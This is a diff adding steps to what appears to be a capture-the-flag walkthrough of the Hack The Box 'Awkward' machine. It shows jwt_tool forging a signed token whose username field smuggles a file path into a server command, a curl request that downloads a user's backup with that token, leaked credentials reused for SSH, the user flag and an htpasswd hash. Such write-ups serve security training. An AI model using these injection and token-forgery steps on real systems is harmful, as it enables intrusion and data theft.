@@ -589,3 +589,157 @@ cd /home/bean/Documents/backup_tmp
 tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
 rm -r /home/bean/Documents/backup_tmp
 ```
+
+
+
+```console
+└─$ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2OTA0MTAwfQ.Tao2-H_k4iIaqh1WHmElOKuDs3C4RdBe9AyaI5vjiJU -S hs256 -p "123beany123" -T
+
+        \   \        \         \          \                    \ 
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.2.6                \______|             @ticarpi      
+
+Original JWT: 
+
+
+====================================================================
+This option allows you to tamper with the header, contents and 
+signature of the JWT.
+====================================================================
+
+Token header values:
+[1] alg = "HS256"
+[2] typ = "JWT"
+[3] *ADD A VALUE*
+[4] *DELETE A VALUE*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 0
+
+Token payload values:
+[1] username = "christopher.jones"
+[2] iat = 1666904100    ==> TIMESTAMP = 2022-10-27 15:55:00 (UTC)
+[3] *ADD A VALUE*
+[4] *DELETE A VALUE*
+[5] *UPDATE TIMESTAMPS*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 1
+
+Current value of username is: christopher.jones
+Please enter new value and hit ENTER
+> /' /home/bean/Documents/backup/bean_backup_final.tar.gz '
+[1] username = "/' /home/bean/Documents/backup/bean_backup_final.tar.gz '"
+[2] iat = 1666904100    ==> TIMESTAMP = 2022-10-27 15:55:00 (UTC)
+[3] *ADD A VALUE*
+[4] *DELETE A VALUE*
+[5] *UPDATE TIMESTAMPS*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 0
+jwttool_902be2192ed541c7428b87be94c7055f - Tampered token - HMAC Signing:
+[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NjkwNDEwMH0.JFJO7-Gmt0qknUmR_k6dPHu_geyocouMIy8bbG69S-Q
+```
+
+
+```
+└─$ curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NjkwNDEwMH0.JFJO7-Gmt0qknUmR_k6dPHu_geyocouMIy8bbG69S-Q" --output bean_backup_final.zip
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 31716  100 31716    0     0   143k      0 --:--:-- --:--:-- --:--:--  144k
+```
+
+After downloading go to your file manager and open the zip and then extract the contents. You should get an error but the files will still get extracted.
+
+
+```console
+└─$ cat bean/bean_backup_final_FILES/bean_backup/.config/xpad/content-DS1ZS1 
+TO DO:
+- Get real hat prices / stock from Christine
+- Implement more secure hashing mechanism for HR system
+- Setup better confirmation message when adding item to cart
+- Add support for item quantity > 1
+- Implement checkout system
+
+boldHR SYSTEM/bold
+bean.hill
+014mrbeanrules!#P
+
+https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html
+
+boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold
+````
+
+```console
+└─$ ssh bean@hat-valley.htb 
+bean@hat-valley.htb's password: 
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Last login: Sun Oct 23 21:38:08 2022 from 10.10.14.6
+bean@awkward:~$ 
+```
+```console
+bean@awkward:~$ cat user.txt
+c14351cd4d8b1f018bed794e94c871bf
+```
+```console
+bean@awkward:/tmp$ cat /var/www/store/README.md 
+# Hat Valley - Shop Online!
+
+### To Do
+1. Waiting for SQL database to be setup, using offline files for now, will merge with database once it is setup
+2. Implement checkout system, link with credit card system (Stripe??)
+3. Implement shop filter
+4. Get full catalogue of items
+
+### How to Add New Catalogue Item
+1. Copy an existing item from /product-details and paste it in the same folder, changing the name to reflect a new product ID
+2. Change the fields to the appropriate values and save the file.  
+-- NOTE: Please leave the header on first line! This is used to verify it as a valid Hat Valley product. --
+
+### Hat Valley Cart
+Right now, the user's cart is stored within /cart, and is named according to the user's session ID. All products are appended to the same file for each user.
+To test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website!
+```
+
+
+```console
+bean@awkward:/tmp$ cat /etc/nginx/conf.d/.htpasswd 
+admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
+```
+```console
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                            
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                                                        
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3002          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 ::1:25                  :::*                    LISTEN      -  
+```
